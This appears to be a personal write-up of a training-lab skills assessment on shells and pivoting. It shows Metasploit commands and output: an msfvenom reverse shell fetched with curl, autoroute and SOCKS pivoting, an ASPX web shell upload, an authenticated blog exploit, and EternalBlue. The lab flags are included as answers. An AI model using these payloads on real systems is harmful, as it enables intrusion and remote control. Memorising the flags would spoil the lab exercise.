
The foothold can call back to my machine, so I will open a meterpreter reverse shell

## Preparation

### 1 -  {Attacking Machine}Generate Payload to call back home 
```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o reverse.sh
```

### 2 - {Attacking Machine}Run msfconsole connection handler
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT '4444'; run"
```

### 3 - {Attacking Machine}Starting a pyhton HTTP Server

The server is going to be started in the port 8080 and will be bind to **tun0 ** interface IP, therefore only accepting connections from that network

```
python3 -m http.server 8080 -b $(ip addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
```


### 4 - {Target Machine}Get the Payload from the attacking machine 

Attention to:

- That IP was mine at that moment
- filename was the defined earlier, when the payload was generated
- The output folder,  I choose **/tmp** , because usually there are no permissions problems.

```
curl http://10.10.14.106:8080/reverse.sh --output /tmp/shell.sh
```

Once the file is downloaded, you can shutdown the python server on the attacking machine

### 5 - {Target Machine}Grant execution permission and executing the payload

```
chmod u+x shell.sh
```

This grants the owner of the file permission to execute

Now, executes 

```
/tmp/shell.sh
```


This will grant us a meterpreter shell


### 6 - {Attacking Machine} Pivoting

Now that we have a shell in the foothold machine lets check the hosts file for  other hosts  or networks of interest

```
$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local

```

add vhosts to local host file

```
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local
```

check the network interfaces 

```
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:81:92 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet **10.129.204.126**/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 2046sec preferred_lft 2046sec
    inet6 dead:beef::250:56ff:feb9:8192/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:8192/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:56:69 brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet **172.16.1.5**/23 brd 172.16.1.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:5669/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:8e:e1:38:b8 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```

Press "ctrl+z" to background the  meterpreter session 

```
meterpreter > 
Background session 1? [y/N]  
```

Now we will add the routes from the target machine, the data 

```
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
session => 1
msf6 post(multi/manage/autoroute) > run

[*] Running module against 10.129.204.126
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.254.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.0.0         255.255.254.0      Session 1
   172.17.0.0         255.255.0.0        Session 1
[*] There are currently no IPv6 routes defined.

```

```
meterpreter > route

IPv4 network routes
===================

    Subnet      Netmask        Gateway     Metric  Interface
    ------      -------        -------     ------  ---------
    0.0.0.0     0.0.0.0        10.129.0.1  0       ens192
    10.129.0.0  255.255.0.0    0.0.0.0     0       ens192
    172.16.0.0  255.255.254.0  0.0.0.0     0       ens224
    172.17.0.0  255.255.0.0    0.0.0.0     0       docker0

```

Enable Sock Proxy
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

msf6 auxiliary(server/socks_proxy) >

```

proxychains setup
 make sure that this is the only socks enabled in the file, comment the other if necessary

```
sudo sh -c "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
```

using proxychains

```
sudo proxychains4 -f /etc/proxychains4.conf nmap -n -sT -sV -PN status.inlanefreight.local
```

---


## HOST - 1


## What is the hostname of Host-1? (Format: all lower case)

### 1.1 Enumeration

```
$sudo proxychains4 -f /etc/proxychains4.conf nmap -n -sT -sV -PN status.inlanefreight.local
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.14s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http          Apache Tomcat 10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 531.19 seconds

```

if you access the first service through a browser,  don't forget to enable the socks proxy manually in  the browser configuration, so you can gain advantage of pivoting.
![[Pasted image 20240428191919.png]]

> ==The asnwer is : **shells-winsvr**==

## 2 -  Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

As seen in the  image above, we have a field to upload configuration files, lets try to upload any file that is not  *zip or tar.gz*

![[Pasted image 20240428192510.png]]

I uploaded the [webshell](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx)  to the page above and tried to access the following link 
```
http://status.inlanefreight.local/files/webshell.aspx
```


Andddd we got a webshell , just execute the following command

```
dir c:\shares\
```

![[Pasted image 20240504135829.png]]

> ==The asnwer is : **dev-share**
---

## Host 2

### whatweb
```
$ whatweb http://blog.inlanefreight.local/
http://blog.inlanefreight.local/ [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[PHPSESSID], IP[172.16.1.12], JQuery, Lightbox, PasswordField[password], Script, Title[Inlanefreight Gabber], X-UA-Compatible[IE=edge]
```

### nmap
```
$ sudo nmap -sCV -Pn -O blog.inlanefreight.local
[sudo] password for htb-student: 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-04 13:04 EDT
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.0082s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Inlanefreight Gabber
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:50:56:B9:4C:3B (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.10 seconds
```

### gobuster
```
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blog.inlanefreight.local/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blog.inlanefreight.local/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/05/04 13:10:09 Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 301) [Size: 335] [--> http://blog.inlanefreight.local/data/]
/static               (Status: 301) [Size: 337] [--> http://blog.inlanefreight.local/static/]
/app                  (Status: 301) [Size: 334] [--> http://blog.inlanefreight.local/app/]   
/LICENSE              (Status: 200) [Size: 35149]                                            
/server-status        (Status: 403) [Size: 289]                                              
                                                                                             
===============================================================
2024/05/04 13:17:18 Finished
===============================================================

```


### Accessing the URL's go buster found

![[Pasted image 20240504144358.png]]

```
curl http://blog.inlanefreight.local/data/config.ini

;[database]
;db_connection = sqlite
;sqlite_db = app/db/sqlite/sqlite.db

;[database]
db_connection = mysql
mysql_socket = /var/run/mysqld/mysqld.sock
mysql_host = 127.0.0.1
mysql_port = 3306
mysql_user = root
mysql_pass = "HTB_@cademy_r00t!"
db_name = blog

[profile]
title = Inlanefreight Gabber
name = Slade Wilson
pic_small = static/images/23al.jpg
pic_big = static/images/port.jpg
cover = static/images/cover.jpg

[language]
lang = en

[components]
highlight = true

[custom]
theme = theme02
;header = data/header.html
;styles[] = static/styles/custom1.css
;styles[] = static/styles/custom2.css
;scripts = static/styles/scripts.css

[bbcode]
;bbtags[quote] = "<quote>{param}</quote>"

[admin]
force_login = true
nick = admin
pass = 'admin123!@#'

[friends]
;friends[user] = pass
;friends[user] = pass

[directories]
images_path = data/i/
thumbnails_path = data/t/
logs_path = data/logs/

[proxy]
;proxy = hostname:port
;proxyauth = username:password
;proxytype = CURLPROXY_HTTP ; default, if not set
;proxytype = CURLPROXY_SOCKS4
;proxytype = CURLPROXY_SOCKS5

;URL_PREFIX type:
;proxy = http://your.page.com/proxy.cgi?
;proxyauth = username:password
;proxytype = URL_PREFIX

[system]
timezone = America/New_York
system_name = blog.inlanefreight
version = 1.3
debug = true
logs = false
```

### checking the data/logs folder

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $curl http://blog.inlanefreight.local/data/logs/ajax_access.log
2021-08-24 15:05:00	10.10.14.12	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36	handshake
┌─[htb-student@skills-foothold]─[~]
└──╼ $curl http://blog.inlanefreight.local/data/logs/ajax_errors.log
2021-08-24 15:05:00	10.10.14.12	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36	could not find driver
┌─[htb-student@skills-foothold]─[~]
└──╼ $curl http://blog.inlanefreight.local/data/logs/visitors.log
2021-08-24 15:05:00	10.10.14.12	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
```

### Fortunate information

The Foothold machine don't have any browser in sight and no internet to install one, but I remembered that there is a embedded browser within Burp.


###  Vulnerability Disclosed

In one of the blog posts a vulnerability is mentioned for the blog "https://www.exploit-db.com/exploits/50064", in the link is mentioned that script requires authentication to work and also informs us that  it is a metasploit module, after checking the foothold machine I found the file was already there

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $locate 50064
locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 934.2 days)
/home/administrator/.msf4/modules/blog/50064.rb
/home/administrator/Downloads/50064.rb
/usr/share/exploitdb/exploits/php/webapps/50064.rb
/usr/share/metasploit-framework/modules/exploits/50064.rb

```

But it was not imported into metasploit, so it requires to execute "updatedb" inside metasploit, in order to import the script

```
msf6 > use exploit/50064
msf6 exploit(50064) > options

Module options (exploit/50064):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   admin123!@#               yes       Blog password
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.1.12               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                         yes       The URI of the arkei gate
   USERNAME   admin                     yes       Blog username
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  172.16.1.12      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   PHP payload
   
msf6 exploit(50064) > run

[*] Got CSRF token: e3f6ebfd4a
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/4Gei.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:4444
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2024-05-09 09:56:57 -0400

meterpreter > cat /customscripts/flag.txt
B1nD_Shells_r_cool
meterpreter > 
```

> ==The asnwer is : **B1nD_Shells_r_cool**==


---

## Host 3

### Enumeration

```
[✗]─[htb-student@skills-foothold]─[~]
└──╼ $sudo nmap -sCV -O -Pn --disable-arp-ping 172.16.1.13
[sudo] password for htb-student: 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-09 10:49 EDT
Nmap scan report for 172.16.1.13
Host is up (0.012s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
MAC Address: 00:50:56:B9:EB:EA (VMware)
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016 build 10586 - 14393
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
| smb2-time: 
|   date: 2024-05-09T14:50:06
|_  start_date: 2024-05-09T13:17:41
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:eb:ea (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-09T07:50:06-07:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds

```
### Now let's check for vulnerabilities
```
┌─[✗]─[htb-student@skills-foothold]─[~]
└──╼ $sudo nmap -sV --script vuln -O -Pn --disable-arp-ping -p 80,135,139,445 172.16.1.13
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-10 16:27 EDT
Nmap scan report for 172.16.1.13
Host is up (0.0017s latency).

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-enum: 
|_  /uploads/: Potentially interesting folder
| http-fileupload-exploiter: 
|   
|     Failed to upload and execute a payload.
|   
|     Failed to upload and execute a payload.
|   
|     Failed to upload and execute a payload.
|   
|     Failed to upload and execute a payload.
|   
|_    Failed to upload and execute a payload.
| http-aspnet-debug: 
|_  status: DEBUG is enabled
|_http-server-header: Microsoft-IIS/10.0
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=172.16.1.13
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://172.16.1.13:80/upload.aspx
|     Form id: form1
|_    Form action: ./upload.aspx
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
MAC Address: 00:50:56:B9:05:57 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016 build 10586 - 14393
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 283.01 seconds
```

The target is vulnerable for Eternal Blue, to metasploit we go

### Exploiting


```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > 
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                      Required  Description
   ----                  ---------------                      --------  -----------
   DBGTRACE              false                                yes       Show extra debug trace info
   LEAKATTEMPTS          99                                   yes       How many times to try to leak transaction
   NAMEDPIPE                                                  no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/dat  yes       List of named pipes to check
                         a/wordlists/named_pipes.txt
   RHOSTS                                                     yes       The target host(s), range CIDR identifier, or hosts file with sy
                                                                        ntax 'file:<path>'
   RPORT                 445                                  yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                        no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                       no        The service display name
   SERVICE_NAME                                               no        The service name
   SHARE                 ADMIN$                               yes       The share to connect to, can be an admin share (ADMIN$,C$,...) o
                                                                        r a normal read/write folder share
   SMBDomain             .                                    no        The Windows domain to use for authentication
   SMBPass                                                    no        The password for the specified username
   SMBUser                                                    no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.129.204.126   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 172.16.1.13
rhost => 172.16.1.13
msf6 exploit(windows/smb/ms17_010_psexec) > setg lhost ens224
lhost => ens224 
v
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 172.16.1.13:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.16.1.13:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 172.16.1.13:445       - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.1.13:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 172.16.1.5:4444 
[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Built a write-what-where primitive...
[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.13:445 - Selecting PowerShell target
[*] 172.16.1.13:445 - Executing the payload...
[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 172.16.1.13
[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2024-05-10 16:14:50 -0400

meterpreter > cat C:\Users\Administrator\Desktop\Skills-flag.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > 
meterpreter > cat "C:\Users\Administrator\Desktop\Skills-flag.txt"
One-H0st-Down!
```

> *==The asnwer is : **One-H0st-Down!**==*